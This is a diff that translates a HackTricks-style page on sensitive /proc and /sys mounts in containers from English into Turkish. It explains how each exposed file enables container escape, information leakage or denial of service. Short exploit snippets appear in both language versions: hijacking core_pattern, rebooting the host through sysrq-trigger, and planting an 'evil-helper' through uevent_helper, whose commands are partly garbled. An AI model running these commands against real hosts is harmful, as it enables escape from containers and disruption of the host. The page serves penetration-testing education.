@@ -1,182 +1,174 @@
-# Sensitive Mounts
+# Hassas Montajlar
 
 {{#include ../../../../banners/hacktricks-training.md}}
 
-<figure><img src="../../../..https:/pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
+`/proc` ve `/sys` dizinlerinin uygun ad alanı izolasyonu olmadan açılması, saldırı yüzeyinin genişlemesi ve bilgi sızıntısı gibi önemli güvenlik riskleri oluşturur. Bu dizinler, yanlış yapılandırıldığında veya yetkisiz bir kullanıcı tarafından erişildiğinde, konteyner kaçışına, ana makine değişikliğine veya daha fazla saldırıyı destekleyen bilgilere yol açabilecek hassas dosyalar içerir. Örneğin, `-v /proc:/host/proc` yanlış bir şekilde monte edildiğinde, yol tabanlı doğası nedeniyle AppArmor korumasını atlayabilir ve `/host/proc`'u korumasız bırakabilir.
 
-{% embed url="https://websec.nl/" %}
+**Her potansiyel zafiyetin daha fazla detayını bulabilirsiniz** [**https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts**](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)**.**
 
-The exposure of `/proc` and `/sys` without proper namespace isolation introduces significant security risks, including attack surface enlargement and information disclosure. These directories contain sensitive files that, if misconfigured or accessed by an unauthorized user, can lead to container escape, host modification, or provide information aiding further attacks. For instance, incorrectly mounting `-v /proc:/host/proc` can bypass AppArmor protection due to its path-based nature, leaving `/host/proc` unprotected.
-
-**You can find further details of each potential vuln in** [**https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts**](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)**.**
-
-## procfs Vulnerabilities
+## procfs Zafiyetleri
 
 ### `/proc/sys`
 
-This directory permits access to modify kernel variables, usually via `sysctl(2)`, and contains several subdirectories of concern:
+Bu dizin, genellikle `sysctl(2)` aracılığıyla çekirdek değişkenlerini değiştirme izni verir ve birkaç endişe verici alt dizin içerir:
 
 #### **`/proc/sys/kernel/core_pattern`**
 
-- Described in [core(5)](https://man7.org/linux/man-pages/man5/core.5.html).
-- Allows defining a program to execute on core-file generation with the first 128 bytes as arguments. This can lead to code execution if the file begins with a pipe `|`.
-- **Testing and Exploitation Example**:
+- [core(5)](https://man7.org/linux/man-pages/man5/core.5.html) içinde tanımlanmıştır.
+- Çekirdek dosyası oluşturulduğunda çalıştırılacak bir program tanımlamaya izin verir; ilk 128 bayt argüman olarak kullanılır. Dosya bir boru `|` ile başlarsa, kod yürütmeye yol açabilir.
+- **Test ve Sömürü Örneği**:
 
-  ```bash
-  [ -w /proc/sys/kernel/core_pattern ] && echo Yes # Test write access
-  cd /proc/sys/kernel
-  echo "|$overlay/shell.sh" > core_pattern # Set custom handler
-  sleep 5 && ./crash & # Trigger handler
-  ```
+```bash
+[ -w /proc/sys/kernel/core_pattern ] && echo Yes # Yazma erişimini test et
+cd /proc/sys/kernel
+echo "|$overlay/shell.sh" > core_pattern # Özel işleyici ayarla
+sleep 5 && ./crash & # İşleyiciyi tetikle
+```
 
 #### **`/proc/sys/kernel/modprobe`**
 
-- Detailed in [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
-- Contains the path to the kernel module loader, invoked for loading kernel modules.
-- **Checking Access Example**:
+- [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html) içinde detaylandırılmıştır.
+- Çekirdek modül yükleyicisinin yolunu içerir, çekirdek modüllerini yüklemek için çağrılır.
+- **Erişim Kontrolü Örneği**:
 
-  ```bash
-  ls -l $(cat /proc/sys/kernel/modprobe) # Check access to modprobe
-  ```
+```bash
+ls -l $(cat /proc/sys/kernel/modprobe) # modprobe erişimini kontrol et
+```
 
 #### **`/proc/sys/vm/panic_on_oom`**
 
-- Referenced in [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
-- A global flag that controls whether the kernel panics or invokes the OOM killer when an OOM condition occurs.
+- [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html) içinde referans verilmiştir.
+- OOM durumu meydana geldiğinde çekirdeğin panik yapıp yapmayacağını kontrol eden bir global bayraktır.
 
 #### **`/proc/sys/fs`**
 
-- As per [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html), contains options and information about the file system.
-- Write access can enable various denial-of-service attacks against the host.
+- [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html) gereğince, dosya sistemi hakkında seçenekler ve bilgiler içerir.
+- Yazma erişimi, ana makineye karşı çeşitli hizmet reddi saldırılarını etkinleştirebilir.
 
 #### **`/proc/sys/fs/binfmt_misc`**
 
-- Allows registering interpreters for non-native binary formats based on their magic number.
-- Can lead to privilege escalation or root shell access if `/proc/sys/fs/binfmt_misc/register` is writable.
-- Relevant exploit and explanation:
-  - [Poor man's rootkit via binfmt_misc](https://github.com/toffan/binfmt_misc)
-  - In-depth tutorial: [Video link](https://www.youtube.com/watch?v=WBC7hhgMvQQ)
+- Sihirli numaralarına dayalı olarak yerel olmayan ikili formatlar için yorumlayıcıların kaydedilmesine izin verir.
+- `/proc/sys/fs/binfmt_misc/register` yazılabilir olduğunda ayrıcalık yükselmesine veya root shell erişimine yol açabilir.
+- İlgili sömürü ve açıklama:
+- [Poor man's rootkit via binfmt_misc](https://github.com/toffan/binfmt_misc)
+- Derinlemesine eğitim: [Video link](https://www.youtube.com/watch?v=WBC7hhgMvQQ)
 
-### Others in `/proc`
+### Diğerleri `/proc` içinde
 
 #### **`/proc/config.gz`**
 
-- May reveal the kernel configuration if `CONFIG_IKCONFIG_PROC` is enabled.
-- Useful for attackers to identify vulnerabilities in the running kernel.
+- `CONFIG_IKCONFIG_PROC` etkinse çekirdek yapılandırmasını açığa çıkarabilir.
+- Saldırganlar için çalışan çekirdekteki zafiyetleri tanımlamak için faydalıdır.
 
 #### **`/proc/sysrq-trigger`**
 
-- Allows invoking Sysrq commands, potentially causing immediate system reboots or other critical actions.
-- **Rebooting Host Example**:
+- Sysrq komutlarını çağırmaya izin verir, bu da ani sistem yeniden başlatmalarına veya diğer kritik eylemlere neden olabilir.
+- **Ana Makineyi Yeniden Başlatma Örneği**:
 
-  ```bash
-  echo b > /proc/sysrq-trigger # Reboots the host
-  ```
+```bash
+echo b > /proc/sysrq-trigger # Ana makineyi yeniden başlatır
+```
 
 #### **`/proc/kmsg`**
 
-- Exposes kernel ring buffer messages.
-- Can aid in kernel exploits, address leaks, and provide sensitive system information.
+- Çekirdek halka tamponu mesajlarını açığa çıkarır.
+- Çekirdek sömürülerine, adres sızıntılarına yardımcı olabilir ve hassas sistem bilgilerini sağlayabilir.
 
 #### **`/proc/kallsyms`**
 
-- Lists kernel exported symbols and their addresses.
-- Essential for kernel exploit development, especially for overcoming KASLR.
-- Address information is restricted with `kptr_restrict` set to `1` or `2`.
-- Details in [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
+- Çekirdek tarafından dışa aktarılan sembolleri ve adreslerini listeler.
+- Çekirdek sömürü geliştirme için önemlidir, özellikle KASLR'yi aşmak için.
+- Adres bilgileri `kptr_restrict` 1 veya 2 olarak ayarlandığında kısıtlanır.
+- Detaylar [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html) içinde.
 
 #### **`/proc/[pid]/mem`**
 
-- Interfaces with the kernel memory device `/dev/mem`.
-- Historically vulnerable to privilege escalation attacks.
-- More on [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
+- Çekirdek bellek cihazı `/dev/mem` ile arayüz sağlar.
+- Tarihsel olarak ayrıcalık yükseltme saldırılarına karşı savunmasızdır.
+- Daha fazla bilgi [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html) içinde.
 
 #### **`/proc/kcore`**
 
-- Represents the system's physical memory in ELF core format.
-- Reading can leak host system and other containers' memory contents.
-- Large file size can lead to reading issues or software crashes.
-- Detailed usage in [Dumping /proc/kcore in 2019](https://schlafwandler.github.io/posts/dumping-/proc/kcore/).
+- Sistemin fiziksel belleğini ELF çekirdek formatında temsil eder.
+- Okuma, ana makine sistemi ve diğer konteynerlerin bellek içeriklerini sızdırabilir.
+- Büyük dosya boyutu okuma sorunlarına veya yazılım çökmesine yol açabilir.
+- Detaylı kullanım [Dumping /proc/kcore in 2019](https://schlafwandler.github.io/posts/dumping-/proc/kcore/) içinde.
 
 #### **`/proc/kmem`**
 
-- Alternate interface for `/dev/kmem`, representing kernel virtual memory.
-- Allows reading and writing, hence direct modification of kernel memory.
+- Çekirdek sanal belleğini temsil eden `/dev/kmem` için alternatif bir arayüzdür.
+- Okuma ve yazma izni verir, dolayısıyla çekirdek belleğini doğrudan değiştirmeye olanak tanır.
 
 #### **`/proc/mem`**
 
-- Alternate interface for `/dev/mem`, representing physical memory.
-- Allows reading and writing, modification of all memory requires resolving virtual to physical addresses.
+- Fiziksel belleği temsil eden `/dev/mem` için alternatif bir arayüzdür.
+- Okuma ve yazma izni verir, tüm belleği değiştirmek için sanal adreslerin fiziksel adreslere çözülmesi gerekir.
 
 #### **`/proc/sched_debug`**
 
-- Returns process scheduling information, bypassing PID namespace protections.
-- Exposes process names, IDs, and cgroup identifiers.
+- PID ad alanı korumalarını atlayarak süreç zamanlama bilgilerini döndürür.
+- Süreç adlarını, kimliklerini ve cgroup tanımlayıcılarını açığa çıkarır.
 
 #### **`/proc/[pid]/mountinfo`**
 
-- Provides information about mount points in the process's mount namespace.
-- Exposes the location of the container `rootfs` or image.
+- Sürecin montaj ad alanındaki montaj noktaları hakkında bilgi sağlar.
+- Konteyner `rootfs` veya görüntüsünün konumunu açığa çıkarır.
 
-### `/sys` Vulnerabilities
+### `/sys` Zafiyetleri
 
 #### **`/sys/kernel/uevent_helper`**
 
-- Used for handling kernel device `uevents`.
-- Writing to `/sys/kernel/uevent_helper` can execute arbitrary scripts upon `uevent` triggers.
-- **Example for Exploitation**: %%%bash
+- Çekirdek cihaz `uevents`'lerini işlemek için kullanılır.
+- `/sys/kernel/uevent_helper`'a yazmak, `uevent` tetikleyicileri üzerine rastgele betikler çalıştırabilir.
+- **Sömürü Örneği**: %%%bash
 
-  #### Creates a payload
+#### Bir yük oluşturur
 
-  echo "#!/bin/sh" > /evil-helper echo "ps > /output" >> /evil-helper chmod +x /evil-helper
+echo "#!/bin/sh" > /evil-helper echo "ps > /output" >> /evil-helper chmod +x /evil-helper
 
-  #### Finds host path from OverlayFS mount for container
+#### Konteyner için OverlayFS montajından ana makine yolunu bulur
 
-  host*path=$(sed -n 's/.*\perdir=(\[^,]\_).\*/\1/p' /etc/mtab)
+host*path=$(sed -n 's/.*\perdir=(\[^,]\_).\*/\1/p' /etc/mtab)
 
-  #### Sets uevent_helper to malicious helper
+#### uevent_helper'ı kötü niyetli yardımcıya ayarlar
 
-  echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
+echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
 
-  #### Triggers a uevent
+#### Bir uevent tetikler
 
-  echo change > /sys/class/mem/null/uevent
+echo change > /sys/class/mem/null/uevent
 
-  #### Reads the output
+#### Çıktıyı okur
 
-  cat /output %%%
+cat /output %%%
 
 #### **`/sys/class/thermal`**
 
-- Controls temperature settings, potentially causing DoS attacks or physical damage.
+- Sıcaklık ayarlarını kontrol eder, bu da DoS saldırılarına veya fiziksel hasara neden olabilir.
 
 #### **`/sys/kernel/vmcoreinfo`**
 
-- Leaks kernel addresses, potentially compromising KASLR.
+- Çekirdek adreslerini sızdırır, bu da KASLR'yi tehlikeye atabilir.
 
 #### **`/sys/kernel/security`**
 
-- Houses `securityfs` interface, allowing configuration of Linux Security Modules like AppArmor.
-- Access might enable a container to disable its MAC system.
+- Linux Güvenlik Modüllerinin (AppArmor gibi) yapılandırılmasına izin veren `securityfs` arayüzünü barındırır.
+- Erişim, bir konteynerin MAC sistemini devre dışı bırakmasına olanak tanıyabilir.
 
-#### **`/sys/firmware/efi/vars` and `/sys/firmware/efi/efivars`**
+#### **`/sys/firmware/efi/vars` ve `/sys/firmware/efi/efivars`**
 
-- Exposes interfaces for interacting with EFI variables in NVRAM.
-- Misconfiguration or exploitation can lead to bricked laptops or unbootable host machines.
+- NVRAM'deki EFI değişkenleri ile etkileşim kurmak için arayüzler açığa çıkarır.
+- Yanlış yapılandırma veya sömürü, bozuk dizüstü bilgisayarlara veya başlatılamayan ana makinelerle sonuçlanabilir.
 
 #### **`/sys/kernel/debug`**
 
-- `debugfs` offers a "no rules" debugging interface to the kernel.
-- History of security issues due to its unrestricted nature.
+- `debugfs`, çekirdeğe "kural yok" hata ayıklama arayüzü sunar.
+- Kısıtlanmamış doğası nedeniyle güvenlik sorunları geçmişi vardır.
 
-### References
+### Referanslar
 
 - [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)
 - [Understanding and Hardening Linux Containers](https://research.nccgroup.com/wp-content/uploads/2020/07/ncc_group_understanding_hardening_linux_containers-1-1.pdf)
 - [Abusing Privileged and Unprivileged Linux Containers](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2016/june/container_whitepaper.pdf)
-
-<figure><img src="../../../..https:/pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
-
-{% embed url="https://websec.nl/" %}
 
 {{#include ../../../../banners/hacktricks-training.md}}
